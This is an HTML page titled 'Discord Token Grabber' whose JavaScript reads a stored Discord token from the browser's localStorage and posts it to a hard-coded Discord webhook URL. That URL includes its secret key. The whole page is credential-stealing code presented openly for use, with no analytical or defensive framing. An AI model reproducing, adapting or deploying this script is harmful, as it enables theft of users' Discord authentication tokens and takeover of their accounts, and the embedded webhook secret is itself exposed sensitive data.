<!DOCTYPE html>
<html>
<head>
  <title>Discord Token Grabber</title>
</head>
<body>
  <h1>Discord Token Grabber</h1>
  <p>Click the button below to send your Discord token to the specified webhook:</p>
  <button onclick="grabToken()">Grab Token</button>

  <script>
    function grabToken() {
      // Get the Discord token from the local storage
      var token = localStorage.getItem("token");

      // Check if the token exists
      if (token) {
        // Webhook URL
        var webhookUrl = "https://discord.com/api/webhooks/1290240903889551390/Ukw61tWNoBGeFL-IRrK0BlfjgyfkzMguKGL93hmmIBWPCtWN8RqVUUrEenf9KDAt0WQk";

        // Create a new XMLHttpRequest
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webhookUrl);
        xhr.setRequestHeader("Content-Type", "application/json");

        // Prepare the payload
        var payload = {
          content: "Discord Token: " + token
        };

        // Send the request
        xhr.send(JSON.stringify(payload));

        // Display a message to the user
        alert("Discord token sent to the webhook!");
      } else {
        alert("Discord token not found. Please enable local storage access in your browser settings.");
      }
    }
  </script>
</body>
</html>
